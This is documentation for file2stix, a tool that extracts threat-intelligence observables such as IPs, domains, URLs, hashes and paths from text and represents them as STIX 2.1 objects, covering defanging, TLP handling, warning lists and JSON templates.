# Extractions

file2stix extracts observables from text and translates them into STIX 2.1 Objects. This section of the documentation describes the templates of the STIX Objects created.

## Defanging

Defanging obfuscates indicators into a safer representations so that a user reading a report does not accidentally click on a malicious URL or inadvertently run malicious code. Many cyber threat intelligence reports shared electronically employ defanging.

Typical types of fanged Observables include IPv4 addresses (e.g. `1.1.1.1`), IPv6 addresses (e.g. `2001:0db8:85a3:0000:0000:8a2e:0370:7334`), domain names (e.g. `example.com`), URLs (e.g. `https://example.com/research/index.html`), email addresses (e.g. `example@example.com`), file extensions (e.g. `malicious.exe`), and directory paths (e.g. `C:\\Windows\\System32`).

Unfortunately, there is no universal standard for defanging, although there are some common methods. Some samples of defanging I have observed include the following:

* Wrapping one or more special characters in `[` `]`
  * e.g. `www[.]example[.]com`
  * e.g. `http[:]//example.com`
  * e.g. `http[://]example.com`
  * e.g. `1.1.1.1[/]24`
* Wrapping one or more special characters in `{` `}`
* Wrapping one or more special characters in `(` `)`
* Prefixing one or more special characters with `[`
  * e.g. `www[.example[.com`
  * e.g. `http[://example.com`
  * e.g. `http[://example.com`
* Prefixing one or more special characters with `\`
* Replacing `http` and `hxxp`
  * e.g. `hxxps://google.com`
* Replacing `.` with ` dot `
  * e.g. `example@example dot com`
  * e.g. `http://example dot com`
* Replacing `.` with `[dot]` (or  `(dot)`, or `{dot}`)
  * e.g. `example@example[dot]com`
* Replacing `@` with ` at `
  * e.g. `example at example.com`
* Replacing `@` with `[at]` (or  `(at)`, or `{at}`)
  * e.g. `example[at]example.com` 

Note, a combination of the above techniques are also commonly implemented used. For example replacing `.` with ` dot ` and replacing `@` with ` at ` for an email like so; fanged = `example at example dot com`, defanged = `example@example.com`

Another example using even more fanging technique combinations for a URL; fanged = `hxxps[:]//test\.example[.)com[/]path`, defanged = `https://test.example.com/path`

file2stix can be used to defang the following observable types

* ipv4
* ipv6
* domain
* url
* email-address

## STIX Support

file2stix only supports STIX version 2.1 [as defined by this specification](https://docs.oasis-open.org/cti/stix/v2.1/os/stix-v2.1-os.html).

## Identities (`identity`)

file2stix assigns a `created_by_ref` property to many Objects. This value is obtained from an Identity Object generated from the template `/stix_templates/identity.yml`.

By defaults the generic file2stix identity will be used. 

You can also change the Identity by modifying the values in the template file.

If you do modify the file make sure to;

1. Only modified the fields described in the following bullet points
2. Keep the quotes (`""`) around values
3. Replace the UUID in the `id` property with a randomly generated UUID v4. [Here is a generator you can use to do this](https://www.uuidgenerator.net/version4)
  * e.g. `identity--acf55024-6bbe-486f-a27a-7967559324f4` -> `identity--bf65f135-7876-4b4f-a48b-4cbd85e77e87`
4. Modify the `created` and `modified` dates, if needed. Be sure to keep the same date/time format `YYYY-DD-MMTHH:MM:SS.sssZ`
5. Update the `name` and `description` fields. If using special json characters be sure to escape them
6. The `identity_class` property [must match one shown here](https://docs.oasis-open.org/cti/stix/v2.1/os/stix-v2.1-os.html#_be1dktvcmyu)
7. The `sectors` property [must match one shown here](https://docs.oasis-open.org/cti/stix/v2.1/os/stix-v2.1-os.html#_oogrswk3onck)

Finally, you must regenerate the identity file using the command XXXX

## TLP (`marking-definition`)

The TLP defined plays two important roles in file2stix.

1. It adds a `marking-definition--` to all Objects
2. Determines how creation of Object should work

file2stix allows for `TLP:GREEN`, `TLP:AMBER`, `TLP:RED` and `TLP:WHITE` definitions to be used when adding Reports. 

This determines the [STIX marking-definition](https://docs.oasis-open.org/cti/stix/v2.1/os/stix-v2.1-os.html#_yd3ar14ekwrs), either;

* `TLP:WHITE` (`marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9`)
* `TLP:GREEN` (`marking-definition--34098fce-860f-48ae-8e50-ebd3cc5e41da`)
* `TLP:AMBER` (`marking-definition--f88d31f6-486f-44da-b317-01333bde0b82`)
* `TLP:RED` (`marking-definition--5e57c739-391a-4eb3-b6be-7d15ca92d5ed`)

The TLP value is reported in the `object_marking_refs` property for the STIX Report Object and all extracted Objects representing extracted Observables (except for ATT&CK or CAPEC, where generic MITRE Objects are used).

The selection of TLP for the Report, also has an impact on how the extracted observable STIX Objects are stored and represented, as follows;

### `TLP:WHITE`

Every time a new observable is detected, a new SDO Object is created with the `object_marking_refs` = `marking-definition--34098fce-860f-48ae-8e50-ebd3cc5e41da` (except for ATT&CK and CAPEC STIX Objects).
 
To demonstrate how this works in practice, lets assume in report 1 an IPv4 address observable (`198.51.100.3`) is detected.

Assuming the IPv4 address (`198.51.100.3`) has not been saved as an IPv4 address SDO previously from a report marked `TLP:WHITE`, a new SDO would be created for it (in this case, lets give it `id` = `ff26c055-6336-5bc5-b98d-13d6226742dd`). The `created` and `modified` properties for this STIX Object would both have the same timestamp (the time of extraction). The object also inherits the TLP level set against the report (in this case, `TLP:WHITE`).

Now consider the future. It is very likely the same observable (in this case IPv4 address) will also extracted from other uploads.

If this IPv4 address (`198.51.100.3`) was later detected in another data source imported to file2stix and that report was marked `TLP:WHITE`, the existing SDO would be used (and updated) to represent the extraction (in this case the SDO with `id` = `ff26c055-6336-5bc5-b98d-13d6226742dd` would be updated).

To update the existing Object, the `created` property of the STIX Object would remain unchanged. However, the `modified` property would be updated to the timestamp of when the observable was last extracted from a report.

This happens in custom extractions too, where a user has set the same extraction string and Object type.

Note in the case of SCOs (e.g. Software Objects), the existing Object would be used, but no update to the Object would happen (because they do not contain a `modified` property).

No `TLP:WHITE` Objects created from Observable extractions (that is all Objects that are not Reports) do not have a `created_by_ref` when `TLP:WHITE` is set. This includes custom extractions.

Extractions can be identified using the SRO linking it to the Report SDO (see: Relationships).

### `TLP:GREEN`, `TLP:AMBER` or `TLP:RED`

In many cases, a person uploading a report will not want the report and the observables extracted to be shared with anyone else beyond their organisation. In such instances they would assign the report a `TLP:GREEN`, `TLP:AMBER` or `TLP:RED` designation.

Like before, every time a new observable is detected, a new SDO Object is created but this time with a `TLP:GREEN`, `TLP:AMBER` or `TLP:RED` marking (except for ATT&CK and CAPEC STIX Objects). 

However, in the case of an observable being detected for the second time, unlike `TLP:WHITE` reports where a single object would be updated, new observable objects are always created for `TLP:GREEN`, `TLP:AMBER` or `TLP:RED`reports.

Put another way, `TLP:GREEN`, `TLP:AMBER` or `TLP:RED` reports will always have unique Objects from extracted Observables linked to them.

All `TLP:GREEN`, `TLP:AMBER` or `TLP:RED` Objects created from Observable extractions contain a `created_by_ref` of the user Identity that uploaded the report.

To give an example, assume report 4 is marked as `TLP:AMBER` and contains an IPv4 address observable (`198.51.100.3`). A new Indicator SDO Object is created for it (id = `01559644-3b76-4e2a-9cdd-4b7417e95640`) with marking definition `TLP:AMBER` and the `created_by_ref` for that user.

Later, report 5 is uploaded by the same user, marked as `TLP:AMBER`, and contains an IPv4 address observable (`198.51.100.3`). Even though it has the same observable value as report 3, because the report is set to `TLP:AMBER`, another unique Indicator SDO will be created for it in the same way.

In this example, report 4 and 5 generate 2 distinct SDOs for the same Observable value `198.51.100.3` in addition to the SDO marked `TLP:WHITE` for `198.51.100.3`.

## Relationship SROS (`relationship`)

There are two types of extractions in file2stix; default and custom.

### Relationships for default extractions between Report and SDO

In the case of default extractions, a Relationship between the extracted Object and Report SDO is created with the `relationship_type` equal to default-extract.

The `created_by_ref` is the Identity ID.

The `created` and `modified` dates match those in the linked Report Object.

Here is the structure of the SRO for default extractions;

```json
  {
    "type": "relationship",
    "spec_version": "2.1",
    "id": "relationship--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<USER IDENTITY ID>",
    "created": "<REPORT CREATED DATE>",
    "modified": "<REPORT CREATED DATE>",
    "relationship_type": "default-extract-from",
    "source_ref": "<EXTRACTED STIX OBSERVABLE ID>",
    "target_ref": "report--<REPORT OBJECT>"
  }
```

### Relationships for custom extractions between Report and SDO

Custom extractions have slightly different Relationship Objects created where the `relationship_type` equal to custom-extract, as follows;

```json
  {
    "type": "relationship",
    "spec_version": "2.1",
    "id": "relationship--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<USER IDENTITY ID>",
    "created": "<REPORT CREATED DATE>",
    "modified": "<REPORT CREATED DATE>",
    "relationship_type": "custom-extract-from",
    "source_ref": "<EXTRACTED STIX OBSERVABLE ID>",
    "target_ref": "report--<REPORT OBJECT>"
  }
```

### Relationships between SCO and SDO

Many extractions that create Indicator Objects also create one or more SCOs. These are joined like so

```json
  {
    "type": "relationship",
    "spec_version": "2.1",
    "id": "relationship--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<USER IDENTITY ID>",
    "created": "<REPORT CREATED DATE>",
    "modified": "<REPORT CREATED DATE>",
    "relationship_type": "pattern-contains",
    "source_ref": "indicator--<EXTRACTED STIX INDICATOR ID>",
    "target_ref": "<EXTRACTED STIX SCO ID>"
  }
```

## Reports (`report`)

All individual data sources ingested or uploaded are represented as a unique [STIX Report SDO](https://docs.oasis-open.org/cti/stix/v2.1/cs01/stix-v2.1-cs01.html#_n8bjzg1ysgdq) that take the following structure;

```json
    {
      "type": "report",
      "spec_version": "2.1",
      "id": "report--<GENERATED BY STIX2 LIBRARY>",
      "created_by_ref": "identity--<IDENTITY ID>",
      "created": "<ITEM INGEST DATE>",
      "modified": "<ITEM INGEST DATE>",
      "name": "File converted: <FILENAME>",
      "published": "<ITEM INGEST DATE>",
      "report_types": ["threat-report"],
      "object_marking_refs": [
        "marking-definition--<TLP LEVEL SET>"
        ],
      "object_refs": ["<LIST OF ALL EXTRACTED OBJECTS>"],
    }
```

Note, the `object_refs` contains all references that are referenced by objects in the report. This includes extracted objects (i.e. Indicator SDOs, Vulnerability SDOs, Software SCOs, Relationship SROs etc.), but also meta Objects (i.e. Identity SCOs, Extension Definitions, Marking Definitions, etc.)

## Extracted Objects

### General Properties

For Reports marked TLP White, STIX 2.1 Objects representing extracted values do not contain `created`, `modified` or `created_by_ref` properties.

For Reports marked TLP Green, Amber or Red STIX 2.1 Objects representing extracted values contain `created`, `modified` and `created_by_ref` properties that matches that of the report Object.

## Warning Lists

Warning Lists identify potentially benign file2stix extractions.

file2stix used MISP Warning Lists (using [PyMISPWarningLists](https://github.com/MISP/PyMISPWarningLists)) to identify potential extractions that should be whitelisted using a custom Extension definition.

```json
{
    "type": "extension-definition",
    "spec_version": "2.1",
    "id": "extension-definition--c8ea5ecb-f4a3-45e7-94de-9b9ba05161af",
    "created_by_ref": "identity--<FILE2STIX ID>",
    "created": "2022-01-01T00:00:00.000Z",
    "modified": "2022-01-01T00:00:00.000Z",
    "name": "MISP Warning Lists",
    "description": "This schema adds MISP Warning List matches to extracted Objects",
    "schema": "https://github.com/MISP/misp-warninglists",
    "version": "1.0",
    "extension_types": [
        "property-extension"
    ]
}
```

Extracted values that match a Warning List are still converted to STIX 2.1 Objects, however, will contain the custom property listing the Warning Lists the extracted value matches with.

For example;

```json
        {
            "type": "indicator",
            "spec_version": "2.1",
            "id": "indicator--fb715301-acf3-4add-a70a-2b96f5ac15f5",
            "created": "2022-09-07T06:18:21.997149Z",
            "modified": "2022-09-08T06:13:24.191194Z",
            "name": "Domain: google.com",
            "indicator_types": [
                "unknown"
            ],
            "pattern": "[ domain-name:value = 'google.com' ]",
            "pattern_type": "stix",
            "pattern_version": "2.1",
            "valid_from": "2022-09-07T06:18:21.997149Z",
            "object_marking_refs": [
                "marking-definition--613f2e26-407d-48c7-9eca-b8e91df99dc9"
            ],
            "extensions": {
                "extension-definition--c8ea5ecb-f4a3-45e7-94de-9b9ba05161af": {
                    "extension_type": "property-extension",
                    "warning_list_match": [
                        "Top 20 000 websites from Cisco Umbrella",
                        "Top 1000 website from Alexa",
                        "List of known google domains",
                        "Top 10 000 websites from Cisco Umbrella",
                        "Top 1000 websites from Cisco Umbrella",
                        "Top 10K most-used sites from Tranco",
                        "Top 5000 websites from Cisco Umbrella",
                        "Top 1,000,000 most-used sites from Tranco",
                        "Top 10K websites from Majestic Million"
                    ]
                }
            }
        },
```

### Custom Warning Lists

You can also create your own Warning Lists. Custom Warning Lists must follow the [MISP Warning List schema](https://github.com/MISP/misp-warninglists/blob/main/schema.json).

An example of a custom warning list can be seen in `tests/file_inputs/custom_warning_lists/list.json`

### 1.1 IPv4 Address Observables without port (`indicator`)

* e.g. `198.51.100.3`
* e.g. `198.51.100.0/24` (with CIDR)

Lots of IPv4 extraction logic exists on the internet ([for example](https://github.com/kvesteri/validators/blob/master/validators/ip_address.py)).

IPv4 Address Observables are represented by [STIX Indicator SDOs (`"type": "indicator"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633), using the [STIX IPv4 Address SCO (`"type": "ipv4-addr"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070714) to create the Indicator SDO `pattern` property.

Here is how ipv4 observables are represented in STIX 2.1 by file2stix;

#### STIX 2.1 indicator SDO

```json
  {
    "type": "indicator",
    "spec_version": "2.1",
    "id": "indicator--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<IF TLP RED/AMBER USER IDENTITY ID>",
    "created": "<REPORT CREATED PROPERTY VALUE>",
    "modified": "<REPORT MODIFIED PROPERTY VALUE>",
    "indicator_types": ["unknown"],
    "name": "ipv4: <EXTRACTED IPV4 OBSERVABLE VALUE>",
    "pattern_type": "stix",
    "pattern": "[ ipv4-addr:value = '<EXTRACTED IPV4 OBSERVABLE VALUE>' ]",
    "valid_from": "<REPORT CREATED PROPERTY VALUE>",
    "object_marking_refs": [
      "marking-definition--<TLP LEVEL SET>"
    ],
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
  }
```

#### STIX 2.1 ipv4-addr SCO

```json
{
  "type": "ipv4-addr",
  "spec_version": "2.1",
  "id": "ipv4-addr--<GENERATED BY STIX2 LIBRARY>",
  "value": "<EXTRACTED IPV4 OBSERVABLE VALUE>",
  "defanged": "<DEFANGED BOOLEAN>",
}
```

### 1.2 IPv4 Address Observables with port (`indicator`)

* e.g. `198.51.100.0:80` (with port)

Note for ipv4 and port observables, the representation is slightly different. When an IPv4 and port is detected (e.g. `1.1.1.1:80`) and Indicator SDO with the following structure is created:

#### STIX 2.1 indicator SDO

```json
  {
    "type": "indicator",
    "spec_version": "2.1",
    "id": "indicator--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<IF TLP RED/AMBER USER IDENTITY ID>",
    "created": "<REPORT CREATED PROPERTY VALUE>",
    "modified": "<REPORT MODIFIED PROPERTY VALUE>",
    "indicator_types": ["unknown"],
    "name": "ipv4: <EXTRACTED IPV4 OBSERVABLE VALUE>",
    "pattern_type": "stix",
    "pattern": "[ ipv4-addr:value = '<EXTRACTED IPV4 OBSERVABLE VALUE>' AND network-traffic:dst_port = '<EXTRACTED IPV4 PORT VALUE>' ]",
    "valid_from": "<REPORT CREATED PROPERTY VALUE>",
    "object_marking_refs": [
      "marking-definition--<TLP LEVEL SET>"
    ],
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
  }
```

#### STIX 2.1 ipv4-addr and network-traffic SCO

```json
{
  "type": "ipv4-addr",
  "spec_version": "2.1",
  "id": "ipv4-addr--<GENERATED BY STIX2 LIBRARY>",
  "value": "<EXTRACTED IPV4 OBSERVABLE VALUE>",
  "defanged": "<DEFANGED BOOLEAN>",
},
{
  "type": "network-traffic",
  "spec_version": "2.1",
  "id": "network-traffic--<GENERATED BY STIX2 LIBRARY>",
  "dst_ref": "ipv4-addr--<IPV4 OBJECT ID>",
  "dst_port": "<EXTRACTED IPV4 PORT VALUE>",
  "protocols": [
    "ipv4"
  ]
}
```

### 2.1 IPv6 Observables without port (`indicator`)

* e.g. `2001:0db8:85a3:0000:0000:8a2e:0370:7334`
* e.g. `2002::abcd:ffff:c0a8:101/64`

Lots of IPv4 extraction logic exists on the internet ([for example](https://github.com/kvesteri/validators/blob/master/validators/ip_address.py)).

IPv6 Observables are represented by [STIX Indicator SDOs (`"type": "indicator"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633), using the [STIX IPv6 Address SCO (`"type": "ipv6-addr"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070717) to create the Indicator SDO `pattern` property.

Here is how ipv6 observables are represented in STIX 2.1 by file2stix;

#### STIX 2.1 indicator SDO

```json
  {
    "type": "indicator",
    "spec_version": "2.1",
    "id": "indicator--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<IF TLP RED/AMBER USER IDENTITY ID>",
    "created": "<REPORT CREATED PROPERTY VALUE>",
    "modified": "<REPORT MODIFIED PROPERTY VALUE>",
    "indicator_types": ["unknown"],
    "name": "ipv6: <EXTRACTED IPV6 OBSERVABLE VALUE>",
    "pattern_type": "stix",
    "pattern": "[ ipv6-addr:value = '<EXTRACTED IPV6 OBSERVABLE VALUE>' ]",
    "valid_from": "<REPORT CREATED PROPERTY VALUE>",
    "object_marking_refs": [
      "marking-definition--<TLP LEVEL SET>"
    ],
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
  }
```

#### STIX 2.1 ipv6-addr SCO

```json
{
  "type": "ipv6-addr",
  "spec_version": "2.1",
  "id": "ipv4-addr--<GENERATED BY STIX2 LIBRARY>",
  "value": "<EXTRACTED IPV6 OBSERVABLE VALUE>",
  "defanged": "<DEFANGED BOOLEAN>"
}
```

### 2.2 IPv6 Observables with port (`indicator`)

* e.g. `[2001:0db8:85a3:0000:0000:8a2e:0370:7334]:80`

Note for ipv6 and port observables, the representation is slightly different. When an IPv6 and port is detected (e.g. `[2001:0db8:85a3:0000:0000:8a2e:0370:7334]:80`) and Indicator SDO with the following structure is created:

#### STIX 2.1 indicator SDO

```json
  {
    "type": "indicator",
    "spec_version": "2.1",
    "id": "indicator--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<IF TLP RED/AMBER USER IDENTITY ID>",
    "created": "<REPORT CREATED PROPERTY VALUE>",
    "modified": "<REPORT MODIFIED PROPERTY VALUE>",
    "indicator_types": ["unknown"],
    "name": "ipv6: <EXTRACTED IPV6 OBSERVABLE VALUE>",
    "pattern_type": "stix",
    "pattern": "[ ipv6-addr:value = '<EXTRACTED IPV6 OBSERVABLE VALUE WITH [] REMOVED>' AND network-traffic:dst_port = '<EXTRACTED IPV6 PORT VALUE>' ]",
    "valid_from": "<REPORT CREATED PROPERTY VALUE>",
    "object_marking_refs": [
      "marking-definition--<TLP LEVEL SET>"
    ],
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
  }
```

#### STIX 2.1 ipv6-addr and network-traffic SCO

```json
{
  "type": "ipv6-addr",
  "spec_version": "2.1",
  "id": "ipv4-addr--<GENERATED BY STIX2 LIBRARY>",
  "value": "<EXTRACTED IPV6 OBSERVABLE VALUE>",
  "defanged": "<DEFANGED BOOLEAN>"
},
{
  "type": "network-traffic",
  "spec_version": "2.1",
  "id": "network-traffic--<GENERATED BY STIX2 LIBRARY>",
  "dst_ref": "ipv4-addr--<IPV6 OBJECT ID>",
  "dst_port": "<EXTRACTED IPV6 PORT VALUE>",
  "protocols": [
    "ipv6"
  ]
}
```

### 3. Domain Name Observables (`indicator`)

* e.g. domain `example.com`
* e.g. sub domain `test.example.com`

Lots of domain extraction logic exists on the internet ([for example](https://github.com/kvesteri/validators/blob/master/validators/domain.py)). It is generally a good idea to also use a dictionary to validate the top level domain to ensure it is a domain (and not a file extension). [Lots of TLD dictionaries exist to do this](https://github.com/cmu-sei/cyobstract/blob/master/etc/tlds.txt), although ensuring they are current can be a challenge.

Domain Name Observables are represented by [STIX Indicator SDOs (`"type": "indicator"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633), using the [STIX Domain Name SCO (`"type": "domain-name"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070687) to create the Indicator SDO `pattern` property.

Here is how domain name observables are represented in STIX 2.1 by file2stix;

#### STIX 2.1 indicator SDO

```json
  {
    "type": "indicator",
    "spec_version": "2.1",
    "id": "indicator--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<IF TLP RED/AMBER USER IDENTITY ID>",
    "created": "<REPORT CREATED PROPERTY VALUE>",
    "modified": "<REPORT MODIFIED PROPERTY VALUE>",
    "indicator_types": ["unknown"],
    "name": "Domain: <EXTRACTED DOMAIN NAME OBSERVABLE VALUE>",
    "pattern_type": "stix",
    "pattern": "[ domain-name:value = '<EXTRACTED DOMAIN NAME OBSERVABLE VALUE>' ]",
    "valid_from": "<REPORT CREATED PROPERTY VALUE>",
    "object_marking_refs": [
      "marking-definition--<TLP LEVEL SET>"
    ],
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
  }
```

#### STIX 2.1 domain-name SCO

```json
{
  "type": "domain-name",
  "spec_version": "2.1",
  "id": "domain-name--<GENERATED BY STIX2 LIBRARY>",
  "value": "<EXTRACTED DOMAIN NAME VALUE>",
  "defanged": "<DEFANGED BOOLEAN>"
}
```

### 4. URL Observables (`indicator`)

* e.g. Full path `https://example.com/research/index.html`
* e.g. Partial path `https://example.com/research/`

Lots of URL extraction logic exists on the internet ([for example](https://github.com/kvesteri/validators/blob/master/validators/url.py)). Like with URLs, it is also worth validating protocol and TLDs in the URL path to ensure they are URLs (and not file paths).

URL Observables are represented by [STIX Indicator SDOs (`"type": "indicator"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633), using the [STIX URL SCO (`"type": "url"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070742) to create the Indicator SDO `pattern` property.

Here is how URL observables are represented in STIX 2.1 by file2stix;

#### STIX 2.1 indicator SDO

```json
  {
    "type": "indicator",
    "spec_version": "2.1",
    "id": "indicator--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<IF TLP RED/AMBER USER IDENTITY ID>",
    "created": "<REPORT CREATED PROPERTY VALUE>",
    "modified": "<REPORT MODIFIED PROPERTY VALUE>",
    "indicator_types": ["unknown"],
    "name": "URL: <EXTRACTED URL OBSERVABLE VALUE>",
    "pattern_type": "stix",
    "pattern": "[ url:value = '<EXTRACTED URL OBSERVABLE VALUE>' ]",
    "valid_from": "<REPORT CREATED PROPERTY VALUE>",
    "object_marking_refs": [
      "marking-definition--<TLP LEVEL SET>"
    ],
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
  }
```

#### STIX 2.1 url SCO

```json
{  
  "type": "url",
  "spec_version": "2.1",
  "id": "url--<GENERATED BY STIX2 LIBRARY>",
  "value": "<EXTRACTED URL VALUE>",
  "defanged": "<DEFANGED BOOLEAN>"
}
```

### 5. File Name Observables (`indicator`)

e.g. `badfile.exe`

The extraction for file extensions requires some dictionary definitions (because filenames can easily be confused with domains in pattern matching). [Here is a comprehensive list of file extensions that can be used](https://github.com/cmu-sei/cyobstract/blob/master/etc/file_exts.txt).

File Name Observables are represented by [STIX Indicator SDOs (`"type": "indicator"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633), using the [STIX File SCO (`"type": "file"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070696) to create the Indicator SDO `pattern` property.

Here is how file names are represented in STIX 2.1 by file2stix;

#### STIX 2.1 indicator SDO

```json
  {
    "type": "indicator",
    "spec_version": "2.1",
    "id": "indicator--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<IF TLP RED/AMBER USER IDENTITY ID>",
    "created": "<REPORT CREATED PROPERTY VALUE>",
    "modified": "<REPORT MODIFIED PROPERTY VALUE>",
    "indicator_types": ["unknown"],
    "name": "File name: <EXTRACTED FILE NAME OBSERVABLE VALUE>",
    "pattern_type": "stix",
    "pattern": "[ file:name = '<EXTRACTED FILE NAME OBSERVABLE VALUE>' ]",
    "valid_from": "<REPORT CREATED PROPERTY VALUE>",
    "object_marking_refs": [
      "marking-definition--<TLP LEVEL SET>"
    ],
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
  }
```

#### STIX 2.1 file SCO

```json
{
  "type": "file",
  "spec_version": "2.1",
  "id": "file--<GENERATED BY STIX2 LIBRARY>",
  "name": "<EXTRACTED FILE NAME VALUE>",
  "defanged": "<DEFANGED BOOLEAN>"
}
```

### 6. Directory Path Observables (`indicator`)

* e.g. Windows Path `C:\Windows\System32`
* e.g. UNIX Path `/System/Library/LaunchDaemons`

Windows paths start with a drive followed by `:\` and directories in path are split by `\`. UNIX Paths start with `/` and directories in path are split by `/`.

Directory Path Observables are represented by [STIX Indicator SDOs (`"type": "indicator"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633), using the [STIX Directory SCO (`"type": "directory"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070685) to create the Indicator SDO `pattern` property.

Here is how directory observables are represented in STIX 2.1 by file2stix;

#### STIX 2.1 indicator SDO

```json
  {
    "type": "indicator",
    "spec_version": "2.1",
    "id": "indicator--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<IF TLP RED/AMBER USER IDENTITY ID>",
    "created": "<REPORT CREATED PROPERTY VALUE>",
    "modified": "<REPORT MODIFIED PROPERTY VALUE>",
    "indicator_types": ["unknown"],
    "name": "Directory: <EXTRACTED DIRECTORY OBSERVABLE VALUE>",
    "pattern_type": "stix",
    "pattern": "[ directory:path = '<EXTRACTED DIRECTORY OBSERVABLE VALUE>' ]",
    "valid_from": "<REPORT CREATED PROPERTY VALUE>",
    "object_marking_refs": [
      "marking-definition--<TLP LEVEL SET>"
    ],
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
  }
```

#### STIX 2.1 directory SCO

```json
{
  "type": "directory",
  "spec_version": "2.1",
  "id": "directory--<GENERATED BY STIX2 LIBRARY>",
  "path": "<EXTRACTED DIRECTORY OBSERVABLE VALUE>"
}
```

### 7. File Hashes (`indicator`)

* e.g. md5 `79054025255fb1a26e4bc422aef54eb4`
* e.g. sha1 ``86F7E437FAA5A7FCE15D1DDCB9EAEAEA377667B8`
* e.g. sha256 `F4BF9F7FCBEDABA0392F108C59D8F4A38B3838EFB64877380171B54475C2ADE8`
* e.g. sha512 `1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75`
* e.g ssdeep `24:Ol9rFBzwjx5ZKvBF+bi8RuM4Pp6rG5Yg+q8wIXhMC:qrFBzKx5s8sM4grq8wIXht`

Lots of hash extraction logic exists on the internet ([for example](https://github.com/kvesteri/validators/blob/master/validators/hashes.py)).

These are represented by [STIX Indicator SDOs (`"type": "indicator"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070633), using the [STIX File SCO (`"type": "file"`)](https://docs.oasis-open.org/cti/stix/v2.1/csprd01/stix-v2.1-csprd01.html#_Toc16070696) to create the Indicator SDO `pattern` property.

Here is how file hashes are represented in STIX 2.1 by file2stix (note, `<FILE HASH TYPE>` = either `md5`, `sha1`, `sha256`, `ssdeep`);

#### STIX 2.1 indicator SDO

```json
  {
    "type": "indicator",
    "spec_version": "2.1",
    "id": "indicator--<GENERATED BY STIX2 LIBRARY>",
    "created_by_ref": "identity--<IF TLP RED/AMBER USER IDENTITY ID>",
    "created": "<REPORT CREATED PROPERTY VALUE>",
    "modified": "<REPORT MODIFIED PROPERTY VALUE>",
    "indicator_types": ["unknown"],
    "name": "<FILE HASH TYPE>: <EXTRACTED FILE HASH OBSERVABLE VALUE>",
    "pattern_type": "stix",
    "pattern": "[ file:hashes.<FILE HASH TYPE> = '<EXTRACTED FILE HASH OBSERVABLE VALUE>' ]",
    "valid_from": "<REPORT CREATED PROPERTY VALUE>",
    "object_marking_refs": [
      "marking-definition--<TLP LEVEL SET>"
    ],
    "extensions": {
      "extension-definition--d83fce45-ef58-4c6c-a3f4-1fbc32e98c6e": {
        "extension_type": "property-extension",
        "warning_list_match": ["MISP WARNING LIST[0]"]
      }
    }
  }
```

#### STIX 2.1 file SCO

```json
{
  "type": "file",
  "spec_version": "2.1",
  "id": "file--<GENERATED BY STIX2 LIBRARY>",
  "hashes": {
    "<FILE HASH TYPE>": "<EXTRACTED FILE HASH OBSERVABLE VALUE>"
  }
}
```

### 8. Email Address Observables (`indicator`)

* e.g. Full email address `example@example.com`

